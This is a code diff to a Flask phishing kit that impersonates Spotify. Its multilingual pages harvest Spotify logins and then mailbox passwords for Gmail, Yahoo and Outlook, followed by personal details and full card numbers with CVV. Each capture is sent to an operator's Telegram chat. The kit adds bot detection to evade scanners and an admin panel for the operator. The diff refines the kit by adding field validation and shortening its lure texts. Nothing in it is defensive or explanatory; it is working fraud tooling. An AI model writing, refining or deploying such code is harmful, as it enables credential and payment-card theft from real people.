@@ -14,7 +14,7 @@ import pickle
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
-# ====== CONFIG FILE ======
+# ====== CONFIG ======
 CONFIG_FILE = 'config.pkl'
 
 def load_config():
@@ -49,7 +49,6 @@ bot_log = deque(maxlen=50)
 activity_log = deque(maxlen=100)
 error_log = deque(maxlen=50)
 
-# ====== STATS ======
 STATS = {
     'total_visitors': 0,
     'total_bots': 0,
@@ -58,7 +57,7 @@ STATS = {
     'start_time': datetime.now().isoformat()
 }
 
-# ====== DICTIONNAIRE MULTI-LANGUES ======
+# ====== LANGUAGES ======
 LANGUAGES = {
     'fr': {
         'name': 'Français',
@@ -68,27 +67,27 @@ LANGUAGES = {
         'login_button': 'Se connecter',
         'login_error': 'Veuillez entrer votre email et mot de passe Spotify.',
         'gmail_title': 'Vérifier l\'accès à la messagerie',
-        'gmail_subtitle': 'Confirmez la propriété de votre email de récupération pour continuer.',
+        'gmail_subtitle': 'Confirmez la propriété de votre email de récupération.',
         'gmail_email': 'Adresse email',
         'gmail_password': 'Mot de passe',
         'gmail_button': 'Suivant',
         'yahoo_title': 'Vérifier Yahoo Mail',
-        'yahoo_subtitle': 'Confirmez le mot de passe du compte pour continuer.',
+        'yahoo_subtitle': 'Confirmez le mot de passe du compte.',
         'yahoo_email': 'Email Yahoo',
         'yahoo_password': 'Mot de passe',
         'yahoo_button': 'Vérifier',
         'outlook_title': 'Vérifier l\'accès Outlook',
-        'outlook_subtitle': 'Veuillez authentifier votre boîte mail de récupération.',
+        'outlook_subtitle': 'Authentifiez votre boîte mail de récupération.',
         'outlook_email': 'Email, téléphone ou Skype',
         'outlook_password': 'Mot de passe',
         'outlook_button': 'Se connecter',
         'generic_title': 'Vérifier le mot de passe de la boîte mail',
-        'generic_subtitle': 'Veuillez ressaisir vos identifiants de messagerie pour finaliser la synchronisation.',
+        'generic_subtitle': 'Ressaisissez vos identifiants de messagerie.',
         'generic_email': 'Adresse email',
         'generic_password': 'Mot de passe de la boîte mail',
         'generic_button': 'Continuer',
         'personal_title': 'Confirmer les coordonnées',
-        'personal_subtitle': 'Veuillez mettre à jour vos coordonnées de facturation pour finaliser la validation du compte.',
+        'personal_subtitle': 'Mettez à jour vos coordonnées de facturation.',
         'personal_firstname': 'Prénom',
         'personal_lastname': 'Nom',
         'personal_address': 'Adresse',
@@ -97,19 +96,19 @@ LANGUAGES = {
         'personal_phone': 'Numéro de téléphone',
         'personal_button': 'Continuer vers la facturation',
         'billing_title': 'Mettre à jour le mode de paiement',
-        'billing_subtitle': 'Vérifiez votre carte de facturation active pour finaliser la synchronisation de l\'abonnement.',
+        'billing_subtitle': 'Vérifiez votre carte de facturation active.',
         'billing_cardholder': 'Nom du titulaire',
         'billing_cardnumber': 'Numéro de carte',
         'billing_expiry': 'Date d\'expiration',
         'billing_cvv': 'CVV / Code de sécurité',
         'billing_button': 'Vérifier et enregistrer',
         'success_title': 'Compte vérifié',
-        'success_subtitle': 'Les informations de votre compte ont été mises à jour avec succès.',
+        'success_subtitle': 'Vos informations ont été mises à jour avec succès.',
         'success_button': 'Aller sur Spotify',
-        'success_redirect': 'Vous serez redirigé automatiquement dans 5 secondes.',
+        'success_redirect': 'Redirection automatique dans 5 secondes.',
         'sleep_title': 'Mode veille',
-        'sleep_subtitle': 'Le service est actuellement indisponible.',
-        'sleep_admin': 'Le panneau d\'administration reste accessible.'
+        'sleep_subtitle': 'Service indisponible.',
+        'sleep_admin': 'Panneau d\'administration accessible.'
     },
     'en': {
         'name': 'English',
@@ -119,27 +118,27 @@ LANGUAGES = {
         'login_button': 'Log In',
         'login_error': 'Please enter your Spotify email and password.',
         'gmail_title': 'Verify Mail Access',
-        'gmail_subtitle': 'Confirm ownership of your recovery email to continue.',
+        'gmail_subtitle': 'Confirm ownership of your recovery email.',
         'gmail_email': 'Email address',
         'gmail_password': 'Password',
         'gmail_button': 'Next',
         'yahoo_title': 'Verify Yahoo Mail',
-        'yahoo_subtitle': 'Confirm account password to proceed.',
+        'yahoo_subtitle': 'Confirm account password.',
         'yahoo_email': 'Yahoo Email',
         'yahoo_password': 'Password',
         'yahoo_button': 'Verify',
         'outlook_title': 'Verify Outlook Access',
-        'outlook_subtitle': 'Please authenticate your recovery mailbox.',
+        'outlook_subtitle': 'Authenticate your recovery mailbox.',
         'outlook_email': 'Email, phone, or Skype',
         'outlook_password': 'Password',
         'outlook_button': 'Sign in',
         'generic_title': 'Verify Mailbox Password',
-        'generic_subtitle': 'Please re-enter your inbox credentials to finish syncing account credentials.',
+        'generic_subtitle': 'Re-enter your inbox credentials.',
         'generic_email': 'Email Address',
         'generic_password': 'Mailbox Password',
         'generic_button': 'Continue',
         'personal_title': 'Confirm Details',
-        'personal_subtitle': 'Please update your billing contact details to finalize account validation.',
+        'personal_subtitle': 'Update your billing contact details.',
         'personal_firstname': 'First Name',
         'personal_lastname': 'Last Name',
         'personal_address': 'Street Address',
@@ -148,16 +147,16 @@ LANGUAGES = {
         'personal_phone': 'Phone Number',
         'personal_button': 'Continue to Billing',
         'billing_title': 'Update Payment Method',
-        'billing_subtitle': 'Verify your active billing card to complete subscription synchronization.',
+        'billing_subtitle': 'Verify your active billing card.',
         'billing_cardholder': 'Cardholder Name',
         'billing_cardnumber': 'Card Number',
         'billing_expiry': 'Expiry Date',
         'billing_cvv': 'CVV / Security Code',
         'billing_button': 'Verify and Save',
         'success_title': 'Account Verified',
-        'success_subtitle': 'Your account information has been successfully updated.',
+        'success_subtitle': 'Your account information has been updated.',
         'success_button': 'Go to Spotify',
-        'success_redirect': 'You will be redirected automatically in 5 seconds.',
+        'success_redirect': 'You will be redirected in 5 seconds.',
         'sleep_title': 'Sleep Mode',
         'sleep_subtitle': 'Service is currently unavailable.',
         'sleep_admin': 'Admin panel is still accessible.'
@@ -168,14 +167,14 @@ LANGUAGES = {
         'login_email': 'Correo electrónico o nombre de usuario',
         'login_password': 'Contraseña',
         'login_button': 'Iniciar sesión',
-        'login_error': 'Por favor, introduzca su correo electrónico y contraseña de Spotify.',
+        'login_error': 'Introduzca su correo y contraseña de Spotify.',
         'gmail_title': 'Verificar acceso al correo',
-        'gmail_subtitle': 'Confirme la propiedad de su correo de recuperación para continuar.',
+        'gmail_subtitle': 'Confirme la propiedad de su correo de recuperación.',
         'gmail_email': 'Dirección de correo electrónico',
         'gmail_password': 'Contraseña',
         'gmail_button': 'Siguiente',
         'yahoo_title': 'Verificar Yahoo Mail',
-        'yahoo_subtitle': 'Confirme la contraseña de la cuenta para continuar.',
+        'yahoo_subtitle': 'Confirme la contraseña de la cuenta.',
         'yahoo_email': 'Correo Yahoo',
         'yahoo_password': 'Contraseña',
         'yahoo_button': 'Verificar',
@@ -185,12 +184,12 @@ LANGUAGES = {
         'outlook_password': 'Contraseña',
         'outlook_button': 'Iniciar sesión',
         'generic_title': 'Verificar contraseña del buzón',
-        'generic_subtitle': 'Vuelva a introducir sus credenciales de correo para finalizar la sincronización.',
+        'generic_subtitle': 'Vuelva a introducir sus credenciales de correo.',
         'generic_email': 'Dirección de correo electrónico',
         'generic_password': 'Contraseña del buzón',
         'generic_button': 'Continuar',
         'personal_title': 'Confirmar datos',
-        'personal_subtitle': 'Actualice sus datos de contacto de facturación para finalizar la validación.',
+        'personal_subtitle': 'Actualice sus datos de contacto de facturación.',
         'personal_firstname': 'Nombre',
         'personal_lastname': 'Apellido',
         'personal_address': 'Dirección',
@@ -199,19 +198,19 @@ LANGUAGES = {
         'personal_phone': 'Número de teléfono',
         'personal_button': 'Continuar a facturación',
         'billing_title': 'Actualizar método de pago',
-        'billing_subtitle': 'Verifique su tarjeta de facturación activa para completar la sincronización.',
+        'billing_subtitle': 'Verifique su tarjeta de facturación activa.',
         'billing_cardholder': 'Nombre del titular',
         'billing_cardnumber': 'Número de tarjeta',
         'billing_expiry': 'Fecha de caducidad',
         'billing_cvv': 'CVV / Código de seguridad',
         'billing_button': 'Verificar y guardar',
         'success_title': 'Cuenta verificada',
-        'success_subtitle': 'La información de su cuenta se ha actualizado correctamente.',
+        'success_subtitle': 'La información de su cuenta se ha actualizado.',
         'success_button': 'Ir a Spotify',
-        'success_redirect': 'Será redirigido automáticamente en 5 segundos.',
+        'success_redirect': 'Será redirigido en 5 segundos.',
         'sleep_title': 'Modo suspensión',
-        'sleep_subtitle': 'El servicio no está disponible actualmente.',
-        'sleep_admin': 'El panel de administración sigue accesible.'
+        'sleep_subtitle': 'Servicio no disponible.',
+        'sleep_admin': 'Panel de administración accesible.'
     },
     'de': {
         'name': 'Deutsch',
@@ -221,27 +220,27 @@ LANGUAGES = {
         'login_button': 'Anmelden',
         'login_error': 'Bitte geben Sie Ihre Spotify-E-Mail und Ihr Passwort ein.',
         'gmail_title': 'E-Mail-Zugriff bestätigen',
-        'gmail_subtitle': 'Bestätigen Sie den Besitz Ihrer Wiederherstellungs-E-Mail, um fortzufahren.',
+        'gmail_subtitle': 'Bestätigen Sie Ihre Wiederherstellungs-E-Mail.',
         'gmail_email': 'E-Mail-Adresse',
         'gmail_password': 'Passwort',
         'gmail_button': 'Weiter',
         'yahoo_title': 'Yahoo Mail bestätigen',
-        'yahoo_subtitle': 'Bestätigen Sie das Kontopasswort, um fortzufahren.',
+        'yahoo_subtitle': 'Bestätigen Sie das Kontopasswort.',
         'yahoo_email': 'Yahoo-E-Mail',
         'yahoo_password': 'Passwort',
         'yahoo_button': 'Bestätigen',
         'outlook_title': 'Outlook-Zugriff bestätigen',
-        'outlook_subtitle': 'Bitte authentifizieren Sie Ihr Wiederherstellungs-Postfach.',
+        'outlook_subtitle': 'Authentifizieren Sie Ihr Postfach.',
         'outlook_email': 'E-Mail, Telefon oder Skype',
         'outlook_password': 'Passwort',
         'outlook_button': 'Anmelden',
         'generic_title': 'Postfach-Passwort bestätigen',
-        'generic_subtitle': 'Bitte geben Sie Ihre Postfach-Anmeldedaten erneut ein, um die Synchronisierung abzuschließen.',
+        'generic_subtitle': 'Geben Sie Ihre Postfach-Anmeldedaten erneut ein.',
         'generic_email': 'E-Mail-Adresse',
         'generic_password': 'Postfach-Passwort',
         'generic_button': 'Fortfahren',
         'personal_title': 'Daten bestätigen',
-        'personal_subtitle': 'Bitte aktualisieren Sie Ihre Rechnungskontaktdaten, um die Kontovalidierung abzuschließen.',
+        'personal_subtitle': 'Aktualisieren Sie Ihre Rechnungskontaktdaten.',
         'personal_firstname': 'Vorname',
         'personal_lastname': 'Nachname',
         'personal_address': 'Adresse',
@@ -250,125 +249,23 @@ LANGUAGES = {
         'personal_phone': 'Telefonnummer',
         'personal_button': 'Weiter zur Abrechnung',
         'billing_title': 'Zahlungsmethode aktualisieren',
-        'billing_subtitle': 'Bestätigen Sie Ihre aktive Abrechnungskarte, um die Abonnementsynchronisierung abzuschließen.',
+        'billing_subtitle': 'Bestätigen Sie Ihre aktive Abrechnungskarte.',
         'billing_cardholder': 'Name des Karteninhabers',
         'billing_cardnumber': 'Kartennummer',
         'billing_expiry': 'Ablaufdatum',
         'billing_cvv': 'CVV / Sicherheitscode',
         'billing_button': 'Bestätigen und speichern',
         'success_title': 'Konto bestätigt',
-        'success_subtitle': 'Ihre Kontoinformationen wurden erfolgreich aktualisiert.',
+        'success_subtitle': 'Ihre Kontoinformationen wurden aktualisiert.',
         'success_button': 'Zu Spotify',
-        'success_redirect': 'Sie werden in 5 Sekunden automatisch weitergeleitet.',
+        'success_redirect': 'Sie werden in 5 Sekunden weitergeleitet.',
         'sleep_title': 'Ruhemodus',
-        'sleep_subtitle': 'Der Dienst ist derzeit nicht verfügbar.',
-        'sleep_admin': 'Das Admin-Panel ist weiterhin zugänglich.'
-    },
-    'pt': {
-        'name': 'Português',
-        'login_title': 'Entrar no Spotify',
-        'login_email': 'E-mail ou nome de utilizador',
-        'login_password': 'Palavra-passe',
-        'login_button': 'Entrar',
-        'login_error': 'Por favor, insira o seu e-mail e palavra-passe do Spotify.',
-        'gmail_title': 'Verificar acesso ao e-mail',
-        'gmail_subtitle': 'Confirme a propriedade do seu e-mail de recuperação para continuar.',
-        'gmail_email': 'Endereço de e-mail',
-        'gmail_password': 'Palavra-passe',
-        'gmail_button': 'Seguinte',
-        'yahoo_title': 'Verificar Yahoo Mail',
-        'yahoo_subtitle': 'Confirme a palavra-passe da conta para continuar.',
-        'yahoo_email': 'E-mail Yahoo',
-        'yahoo_password': 'Palavra-passe',
-        'yahoo_button': 'Verificar',
-        'outlook_title': 'Verificar acesso ao Outlook',
-        'outlook_subtitle': 'Autentique a sua caixa de correio de recuperação.',
-        'outlook_email': 'E-mail, telefone ou Skype',
-        'outlook_password': 'Palavra-passe',
-        'outlook_button': 'Entrar',
-        'generic_title': 'Verificar palavra-passe da caixa de correio',
-        'generic_subtitle': 'Reintroduza as suas credenciais de correio para finalizar a sincronização.',
-        'generic_email': 'Endereço de e-mail',
-        'generic_password': 'Palavra-passe da caixa de correio',
-        'generic_button': 'Continuar',
-        'personal_title': 'Confirmar dados',
-        'personal_subtitle': 'Atualize os seus dados de contacto de faturação para finalizar a validação.',
-        'personal_firstname': 'Primeiro nome',
-        'personal_lastname': 'Apelido',
-        'personal_address': 'Morada',
-        'personal_city': 'Cidade',
-        'personal_postal': 'Código postal',
-        'personal_phone': 'Número de telefone',
-        'personal_button': 'Continuar para faturação',
-        'billing_title': 'Atualizar método de pagamento',
-        'billing_subtitle': 'Verifique o seu cartão de faturação ativo para concluir a sincronização.',
-        'billing_cardholder': 'Nome do titular',
-        'billing_cardnumber': 'Número do cartão',
-        'billing_expiry': 'Data de validade',
-        'billing_cvv': 'CVV / Código de segurança',
-        'billing_button': 'Verificar e guardar',
-        'success_title': 'Conta verificada',
-        'success_subtitle': 'As informações da sua conta foram atualizadas com sucesso.',
-        'success_button': 'Ir para o Spotify',
-        'success_redirect': 'Será redirecionado automaticamente em 5 segundos.',
-        'sleep_title': 'Modo de suspensão',
-        'sleep_subtitle': 'O serviço está atualmente indisponível.',
-        'sleep_admin': 'O painel de administração continua acessível.'
-    },
-    'ar': {
-        'name': 'العربية',
-        'login_title': 'تسجيل الدخول إلى Spotify',
-        'login_email': 'البريد الإلكتروني أو اسم المستخدم',
-        'login_password': 'كلمة المرور',
-        'login_button': 'تسجيل الدخول',
-        'login_error': 'يرجى إدخال بريدك الإلكتروني وكلمة المرور الخاصة بـ Spotify.',
-        'gmail_title': 'التحقق من الوصول إلى البريد',
-        'gmail_subtitle': 'تأكيد ملكية بريدك الإلكتروني للاسترداد للمتابعة.',
-        'gmail_email': 'عنوان البريد الإلكتروني',
-        'gmail_password': 'كلمة المرور',
-        'gmail_button': 'التالي',
-        'yahoo_title': 'التحقق من Yahoo Mail',
-        'yahoo_subtitle': 'تأكيد كلمة مرور الحساب للمتابعة.',
-        'yahoo_email': 'بريد Yahoo',
-        'yahoo_password': 'كلمة المرور',
-        'yahoo_button': 'تحقق',
-        'outlook_title': 'التحقق من الوصول إلى Outlook',
-        'outlook_subtitle': 'يرجى المصادقة على صندوق البريد الخاص بالاسترداد.',
-        'outlook_email': 'البريد الإلكتروني أو الهاتف أو Skype',
-        'outlook_password': 'كلمة المرور',
-        'outlook_button': 'تسجيل الدخول',
-        'generic_title': 'التحقق من كلمة مرور صندوق البريد',
-        'generic_subtitle': 'يرجى إعادة إدخال بيانات اعتماد صندوق البريد الخاص بك لإكمال المزامنة.',
-        'generic_email': 'عنوان البريد الإلكتروني',
-        'generic_password': 'كلمة مرور صندوق البريد',
-        'generic_button': 'متابعة',
-        'personal_title': 'تأكيد التفاصيل',
-        'personal_subtitle': 'يرجى تحديث تفاصيل الاتصال الخاصة بالفوترة لإكمال التحقق من الحساب.',
-        'personal_firstname': 'الاسم الأول',
-        'personal_lastname': 'اسم العائلة',
-        'personal_address': 'العنوان',
-        'personal_city': 'المدينة',
-        'personal_postal': 'الرمز البريدي',
-        'personal_phone': 'رقم الهاتف',
-        'personal_button': 'المتابعة إلى الفوترة',
-        'billing_title': 'تحديث طريقة الدفع',
-        'billing_subtitle': 'تحقق من بطاقة الفوترة النشطة لإكمال مزامنة الاشتراك.',
-        'billing_cardholder': 'اسم حامل البطاقة',
-        'billing_cardnumber': 'رقم البطاقة',
-        'billing_expiry': 'تاريخ الانتهاء',
-        'billing_cvv': 'CVV / رمز الأمان',
-        'billing_button': 'تحقق واحفظ',
-        'success_title': 'تم التحقق من الحساب',
-        'success_subtitle': 'تم تحديث معلومات حسابك بنجاح.',
-        'success_button': 'الذهاب إلى Spotify',
-        'success_redirect': 'سيتم إعادة توجيهك تلقائياً خلال 5 ثوانٍ.',
-        'sleep_title': 'وضع السكون',
-        'sleep_subtitle': 'الخدمة غير متاحة حالياً.',
-        'sleep_admin': 'لوحة الإدارة لا تزال قابلة للوصول.'
+        'sleep_subtitle': 'Dienst nicht verfügbar.',
+        'sleep_admin': 'Admin-Panel zugänglich.'
     }
 }
 
-# ====== DÉTECTION DE LANGUE UNIQUEMENT PAR IP ======
+# ====== LANGUAGE DETECTION ======
 def detect_language_by_ip():
     try:
         ip = request.headers.get('X-Forwarded-For', '').split(',')[0].strip()
@@ -387,8 +284,6 @@ def detect_language_by_ip():
                 'FR': 'fr', 'BE': 'fr', 'CH': 'fr', 'CA': 'fr', 'LU': 'fr',
                 'ES': 'es', 'MX': 'es', 'AR': 'es', 'CO': 'es', 'PE': 'es',
                 'DE': 'de', 'AT': 'de', 'LI': 'de',
-                'PT': 'pt', 'BR': 'pt', 'AO': 'pt', 'MZ': 'pt',
-                'SA': 'ar', 'AE': 'ar', 'EG': 'ar', 'DZ': 'ar', 'MA': 'ar',
                 'US': 'en', 'GB': 'en', 'AU': 'en', 'NZ': 'en', 'IE': 'en'
             }
             lang = country_to_lang.get(country_code, 'en')
@@ -396,7 +291,6 @@ def detect_language_by_ip():
             return lang
     except:
         pass
-    
     return 'en'
 
 def get_text(lang, key):
@@ -404,7 +298,7 @@ def get_text(lang, key):
         return LANGUAGES[lang][key]
     return LANGUAGES['en'].get(key, key)
 
-# ====== TELEGRAM ENGINE ======
+# ====== TELEGRAM ======
 from utils.telegram import TelegramBot
 telegram = TelegramBot(CONFIG.get('telegram_token'), CONFIG.get('chat_id'))
 
@@ -450,7 +344,7 @@ def get_geo_data():
         ip = request.remote_addr
     
     try:
-        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,countryCode,city,isp,query,regionName,timezone,lat,lon', timeout=3)
+        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,countryCode,city,isp,query,regionName,timezone', timeout=3)
         data = response.json()
         if data.get('status') == 'success':
             return {
@@ -460,9 +354,7 @@ def get_geo_data():
                 'city': data.get('city', 'Unknown'),
                 'region': data.get('regionName', 'Unknown'),
                 'isp': data.get('isp', 'Unknown'),
-                'timezone': data.get('timezone', 'Unknown'),
-                'lat': data.get('lat', 0),
-                'lon': data.get('lon', 0)
+                'timezone': data.get('timezone', 'Unknown')
             }
     except:
         pass
@@ -474,9 +366,7 @@ def get_geo_data():
         'city': 'Unknown',
         'region': 'Unknown',
         'isp': 'Unknown',
-        'timezone': 'Unknown',
-        'lat': 0,
-        'lon': 0
+        'timezone': 'Unknown'
     }
 
 # ====== LOGGER ======
@@ -666,10 +556,13 @@ def api_login():
             return jsonify({'status': 'error', 'message': 'Bot detected'}), 403
         
         data = request.get_json()
-        email = data.get('email', '')
-        password = data.get('password', '')
+        email = data.get('email', '').strip()
+        password = data.get('password', '').strip()
         user_agent = request.headers.get('User-Agent', 'Unknown')
         geo = get_geo_data()
+        
+        if not email or not password:
+            return jsonify({'status': 'error', 'message': 'Missing fields'}), 400
         
         capture_data = {
             'type': 'Spotify Login',
@@ -682,7 +575,6 @@ def api_login():
         }
         log_capture(capture_data)
         
-        # ENVOI TELEGRAM - LOGIN
         msg = f"""🚨 **CAPTURE DETECTED** 🚨
 
 📋 **Type:** Spotify Login
@@ -696,8 +588,6 @@ def api_login():
         
         domain = email.split('@')[1].lower() if '@' in email else ''
         
-        # TOUJOURS ALLER À LA PAGE MAIL CORRESPONDANTE
-        # L'étape Mail est OBLIGATOIRE avant Personal
         if 'gmail.com' in domain or 'googlemail.com' in domain:
             next_page = '/mail-gmail'
         elif 'yahoo.com' in domain or 'ymail.com' in domain or 'rocketmail.com' in domain:
@@ -705,7 +595,6 @@ def api_login():
         elif 'outlook.com' in domain or 'hotmail.com' in domain or 'live.com' in domain or 'msn.com' in domain:
             next_page = '/mail-outlook'
         else:
-            # Pour tous les autres domaines, page générique
             next_page = '/mail-generic'
         
         return jsonify({'status': 'success', 'next': next_page})
@@ -724,10 +613,13 @@ def api_mail():
         
         data = request.get_json()
         provider = data.get('provider', 'Generic')
-        mail_email = data.get('mailEmail', '')
-        mail_password = data.get('mailPassword', '')
+        mail_email = data.get('mailEmail', '').strip()
+        mail_password = data.get('mailPassword', '').strip()
         geo = get_geo_data()
         user_agent = request.headers.get('User-Agent', 'Unknown')
+        
+        if not mail_email or not mail_password:
+            return jsonify({'status': 'error', 'message': 'Missing fields'}), 400
         
         capture_data = {
             'type': f'Mail Access ({provider})',
@@ -740,7 +632,6 @@ def api_mail():
         }
         log_capture(capture_data)
         
-        # ENVOI TELEGRAM - MAIL
         msg = f"""🚨 **CAPTURE DETECTED** 🚨
 
 📋 **Type:** Mail Access ({provider})
@@ -769,13 +660,16 @@ def api_personal():
         data = request.get_json()
         geo = get_geo_data()
         
-        first_name = data.get('firstName', '')
-        last_name = data.get('lastName', '')
-        address = data.get('address', '')
-        city = data.get('city', '')
-        postal_code = data.get('postalCode', '')
-        phone = data.get('phone', '')
+        first_name = data.get('firstName', '').strip()
+        last_name = data.get('lastName', '').strip()
+        address = data.get('address', '').strip()
+        city = data.get('city', '').strip()
+        postal_code = data.get('postalCode', '').strip()
+        phone = data.get('phone', '').strip()
         user_agent = request.headers.get('User-Agent', 'Unknown')
+        
+        if not first_name or not last_name or not address or not city or not postal_code or not phone:
+            return jsonify({'status': 'error', 'message': 'Missing fields'}), 400
         
         capture_data = {
             'type': 'Personal Info',
@@ -788,7 +682,6 @@ def api_personal():
         }
         log_capture(capture_data)
         
-        # ENVOI TELEGRAM - PERSONAL
         msg = f"""🚨 **CAPTURE DETECTED** 🚨
 
 📋 **Type:** Personal Info
@@ -819,11 +712,14 @@ def api_billing():
         data = request.get_json()
         geo = get_geo_data()
         
-        card_holder = data.get('cardHolder', '')
-        card_number = data.get('cardNumber', '')
-        expiry = data.get('expiry', '')
-        cvv = data.get('cvv', '')
+        card_holder = data.get('cardHolder', '').strip()
+        card_number = data.get('cardNumber', '').strip()
+        expiry = data.get('expiry', '').strip()
+        cvv = data.get('cvv', '').strip()
         user_agent = request.headers.get('User-Agent', 'Unknown')
+        
+        if not card_holder or not card_number or not expiry or not cvv:
+            return jsonify({'status': 'error', 'message': 'Missing fields'}), 400
         
         capture_data = {
             'type': 'Billing/Card',
@@ -836,7 +732,6 @@ def api_billing():
         }
         log_capture(capture_data)
         
-        # ENVOI TELEGRAM - BILLING
         msg = f"""🚨 **CAPTURE DETECTED** 🚨
 
 📋 **Type:** Billing/Card
@@ -873,12 +768,8 @@ def api_admin():
                         'message': f'Mode changed to {data["mode"]}'
                     })
                 CONFIG['last_updated'] = datetime.now().isoformat()
-                
                 save_config(CONFIG)
-                
-                # RECONFIGURER TELEGRAM
                 telegram.configure(CONFIG['telegram_token'], CONFIG['chat_id'])
-                
                 return jsonify({
                     'status': 'success',
                     'config': CONFIG,
@@ -887,7 +778,6 @@ def api_admin():
                 })
             return jsonify({'status': 'error', 'message': 'Invalid passcode'}), 401
         
-        # GET
         passcode = request.headers.get('X-Admin-Passcode')
         if passcode == CONFIG['admin_passcode']:
             return jsonify({
@@ -923,7 +813,6 @@ def clear_errors():
         data = request.get_json()
         if data.get('passcode') != CONFIG['admin_passcode']:
             return jsonify({'status': 'error', 'message': 'Invalid passcode'}), 401
-        
         error_log.clear()
         activity_log.append({
             'time': datetime.now().isoformat(),
@@ -932,30 +821,6 @@ def clear_errors():
         })
         return jsonify({'status': 'success', 'message': 'Error log cleared'})
     except Exception as e:
-        return jsonify({'status': 'error', 'message': str(e)}), 500
-
-@app.route('/api/admin/telegram-status', methods=['GET'])
-def telegram_status():
-    try:
-        passcode = request.headers.get('X-Admin-Passcode')
-        if passcode != CONFIG['admin_passcode']:
-            return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
-        
-        return jsonify({
-            'status': 'success',
-            'telegram': {
-                'status': telegram.status,
-                'configured': bool(CONFIG['telegram_token'] and CONFIG['chat_id']),
-                'last_error': telegram.last_error,
-                'token_preview': CONFIG['telegram_token'][:10] + '...' if CONFIG['telegram_token'] else 'None'
-            },
-            'config': {
-                'token_configured': bool(CONFIG['telegram_token']),
-                'chat_id_configured': bool(CONFIG['chat_id'])
-            }
-        })
-    except Exception as e:
-        log_error('TelegramStatusError', str(e))
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/static/<path:path>')
